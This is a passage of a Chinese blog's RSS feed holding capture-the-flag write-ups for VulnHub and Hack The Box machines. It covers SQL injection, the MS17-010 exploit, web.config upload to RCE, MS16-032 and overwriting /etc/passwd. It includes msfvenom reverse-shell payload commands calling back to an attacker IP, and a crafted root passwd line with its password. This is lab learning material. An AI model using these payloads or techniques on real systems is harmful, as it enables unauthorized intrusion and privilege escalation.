      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x004-mercury/</guid>
      <description>&lt;p&gt;开局就遇到一个问题：靶机无法获取IP地址，通过搜索解决办法记录如下：&lt;/p&gt;
&lt;p&gt;重启虚拟机出现VM图标的时候就需要长按shift，然后进入GRUB：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE813ca0f6ce86d53c24b1862908bf683e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;选择第二个Advanced options for Ubuntu:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE41b83a18e48bf0054e408f052bb781b5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;按e编辑：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1cac39334ab07943bfbee4d9eda8a3ee%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf44f2aa84809261a3aab6afd2c62ae87%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;vi /etc/netplan/00-installer-config.yaml：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb851afecdc059a38417f5ca206a807f7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;改成ens33，随后重启即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf450dfa90e0953af37122fdfba7632b6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;ip端口扫描&#34;&gt;IP&amp;amp;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE924bc2595f28b8fcb760f2c4281a2467%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;目录扫描&#34;&gt;目录扫描：&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE83fc40ba45e07807aec93f8f9e463505%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;robots.txt无有效页面，但是，手滑输错，发现以下页面，根据语句意思发现mercuryfacts目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE28fcf0bc9ccb263f8edac002773aa226%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0d51ae14207ba33901c72a41704da006%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;web渗透&lt;/h1&gt;
&lt;p&gt;发现提示，可能存在sql注入？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa3e5cdf3841d13add279eadf42d7e5e6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;SQL注入！：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc9542df307fb30364ea18a50b02e1231%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;注入发现账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8cc83d12618d2473bb14829fba7a5675%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;ssh爆破&#34;&gt;SSH爆破&lt;/h1&gt;
&lt;p&gt;账号：webmaster&lt;/p&gt;
&lt;p&gt;密码：mercuryisthesizeof0.056Earths&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE31ba0ad457a5bdf0c9912b651df1a619%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;user_flag.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd0a1311e27b1c24aeb1c6b44798a258c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sudo -l 没有东西&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7906d55b068b8c0719de73135367174a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现一个新的账号密码：&lt;/p&gt;
&lt;p&gt;linuxmaster&lt;/p&gt;
&lt;p&gt;mercurymeandiameteris4880km&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE28e0dabd793b6b4cade949157b1059e8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可以成功切换：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe1c27381ea1d479da806a3584c77ecf2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sudo -l :&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4ee19b49f17096e466076aa7b6c43ee7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X005 Blue</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x005-blue/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x005-blue/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2e5d325be6572acc6fe7225b6f12fc65image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE461282104c88e9e96c68c6156f40047fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb84c8731af18fe56ae61f82e2ca73235image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;本来是不太愿意用ms17-010直接打，但是看了一下smb的东西，好像也不太行：&lt;/p&gt;
&lt;p&gt;但是尽量不适用msf吧：&lt;/p&gt;
&lt;p&gt;这个失败了：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/mez-0/MS17-010-Python&#34;&gt;https://github.com/mez-0/MS17-010-Python&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;换一个：&lt;/p&gt;
&lt;p&gt;简书的讲解：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.jianshu.com/p/430b2bbfdecc&#34;&gt;https://www.jianshu.com/p/430b2bbfdecc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这种方式也失败了。&lt;/p&gt;
&lt;p&gt;最后使用了，这个办法：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfd8cb7031252cbea1d9f4dd8ba9d8171image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;生成一个木马：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f exe EXITFUNC=thread -o shell.exe&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3fb254004dfaa2ada5be2a32d11e02e3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;编辑zzz_exploit.py：&lt;/p&gt;
&lt;p&gt;添加两个\&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEaa8b069bbfe0c3ee2fbb90d26e55d862image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个位置，添加相关操作：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE80351537bd1389c2977159194987b2e5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用vim可能会报错，可以使用记事本打开，可能是vim的问题：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE84dfc6938a3d156908ed49e5df31c8a3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;运行：&lt;/p&gt;
&lt;p&gt;python2 zzz_exploit.py 10.10.10.40 ntsvcs&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf3cc53540399883ad12f7e55611bc064image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE06ae831433cd098b094bf047d02215f9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE89e4c49a655b9af459755049c3e3014fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x005 Nyx1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x005-nyx1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x005-nyx1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa7539f990e2272d286848d0dd4b30594%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;突破&#34;&gt;突破&lt;/h1&gt;
&lt;p&gt;目录扫描没有东西，发现提示：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE694d97b4d7d842dc849763041016bbe7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;cewl收集密码，但是没爆出来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE23f4b310f3c52f8d671b1ba2a42ae1c9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看WP，发现nmap扫描不够仔细：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbfad9953b30ea1fd44f1212fc144357b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;gobuster 的目录扫描同样深度不够：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc241ee655747d357c41721f0e5792afd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;nmap扫出的是一个密钥文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE822d7e7d31a0198c504a1520f579ff00%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用密钥连接：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaa6ead165a5f52834a4a801783825532%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;user.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7043d9f0bee5074176c989589bcdeaf9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sudo -l&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7a1997783f3707170de9b7ff48a5eee6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;GCC SUDO提权&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE40b176799a71f0652c7fb9f39afb2b81%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe09ad094a2360a7b4949a411fc7d8b09%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;root.txt是空的？&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X006 Bounty</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x006-bounty-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x006-bounty-/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE50b73d52938f8dd92624582f43421360image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE158a53ed50b04b02fe88333a25910e95image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;目录扫描要仔细，gobuster最开始没扫出来，添加aspx后缀后扫出了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd074fad91d7ae895e3d24de42037f0c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;还有一个：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE290bef7cba7d9b437c8cef6f1fa1ed8aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;先上传一个试试：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEffd0b44cc682f4923731a293cd93e360image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE14cb2d762c34f76a20036fa7fc577504image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 lPORT=8888 -f aspx -o cxk.aspx&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEff697c6b8d0b448688cc2c2d7b448c5eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看样子是后端校验：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE428c4be128599fd2c3cc19b820edbd6aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里是没想到的，我一直以为是常见的IIS解析漏洞，但是发现不行，后面看了一下官方文档，这里要FUZZ一下后缀，看看能上传哪些后缀：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0ed7b3810f71f2d3a927add6bab5a3bbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;/SecLists-2023.2/Fuzzing/extensions-skipfish.fuzz.txt&lt;/p&gt;
&lt;p&gt;发现congfig是可以使用的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE381217727c5fde95497933ca69fb993aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个后缀在IIS7.0以上是可以getshell的：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/&#34;&gt;https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;同时可以在github找到相关项目：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/0xPurpl3john/web.config&#34;&gt;https://github.com/0xPurpl3john/web.config&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdaecd0d5ed32bb9f118511101dcba521image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcc32ac0e88720bca4d2ecdddfd9ff008image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE833669069ef148827677d372d1a1ae09image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdb6c7fb99adecbc38aae0f5bc2df1bfdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;也是没有补丁的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE39f51e9e0b66cda8726eba501f80d082image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/zcgonvh/MS16-032/releases/tag/Release&#34;&gt;https://github.com/zcgonvh/MS16-032/releases/tag/Release&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;运行之前需要重新弹个shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE13637ed094fc8cff71e82ec81c435a3aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2a99ab8a07082ec27e2d6e7dddca9cc5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe66629d806b17a054946a7d51858ecd3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe1072ee6aeb1fa4934813b4752dee048image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE64af2bfec5388fe2617f3e5daaad784fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x006 Misdirection1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x006-misdirection1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x006-misdirection1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描：&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE809976807a8d1443447a68328cbbfe3e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE94b844bf08b42b37147f53240688edd8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;web渗透&lt;/h1&gt;
&lt;p&gt;两个web端口，例行公事，目录扫描：&lt;/p&gt;
&lt;p&gt;8080端口扫描结果：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE526ca1d7906e40fab934a82c9c054579%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口扫描极慢，先看了一下8080端口的扫描结果，发现一个命令行页？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5361cf692f18a441e669af1c32a006b0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell，直接弹shell 弹不回来，远程下载webshell 反弹shell成功:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE368bce6dd5c62305d699ea987ffb9841%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;读取user.txt提示没有权限，然后sudo -l 发现可以无密码执行/bin/bash即可查看，并且成功提权到brexit&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa6980f069602f836394cf544e4dae8c9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;发现passwd文件可写&#34;&gt;发现passwd文件可写&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf327939a9b96fc5054efed9aeb1621d7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;生成密码&#34;&gt;生成密码&lt;/h3&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE975746eadd5935d93cf04daffd804e8c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;修改密码为这个1zyty2uoj1au20m0xd4wo1ymw9z0----abcd1234&#34;&gt;修改密码为这个：$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0    Abcd1234&lt;/h3&gt;
&lt;p&gt;root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash&lt;/p&gt;
&lt;p&gt;这里修改文件极其诡异，VI盲改老是找不到正确的位置，sed命令修改也总是有问题，最后把passwd文件通过kali传输进去，直接覆盖掉就可以了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9fc6e33cfcbc02551f5ecc9bef897bbd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X007 Acute</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x007-acute/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x007-acute/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7bced707209a355e5b0d8e37665b10c6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1553e03a5a52725213cc98b0d93dad66image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe9bc11587966185546c54c64b1c03fdcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;端口扫描没发现东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc3827f6e5c0c0ed9fe650ad4b0d794b8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开网站看一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfe70211233839785d604541ed4534e40image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改hosts:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd18aed551b61f788a2d4b032bd126d42image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里是我看到了，但是不知道怎么利用的：&lt;/p&gt;
&lt;p&gt;这里的用户名是看到了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7d4afbef001b7925f4b2b74890cd4006image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时，这个word也看到了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE738cf0d3e074876b486600fd30f2d176image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是没看文件属性：&lt;/p&gt;
